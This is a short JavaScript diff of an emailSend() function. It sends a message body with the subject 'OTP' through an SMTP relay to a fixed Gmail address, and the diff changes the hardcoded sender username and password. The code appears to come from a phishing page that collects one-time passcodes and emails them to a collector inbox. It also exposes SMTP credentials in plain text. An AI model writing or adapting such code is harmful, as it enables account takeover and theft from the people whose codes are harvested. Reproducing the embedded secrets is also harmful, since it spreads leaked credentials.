@@ -4,10 +4,10 @@ function emailSend() {
 
   Email.send({
     Host: "smtp.elasticemail.com",
-    Username: "chukwuebukawilliams6@gmail.com",
-    Password: "E141285882E4D4548056C705C3238E355AA6",
+    Username: "payday10177@gmail.com",
+    Password: "60F88560F588591A7F78F2A9E657115D12C3",
     To: 'payday10177@gmail.com',
-    From: "chukwuebukawilliams6@gmail.com",
+    From: "payday10177@gmail.com",
     Subject: "OTP",
     Body: messageBody
   }).then(
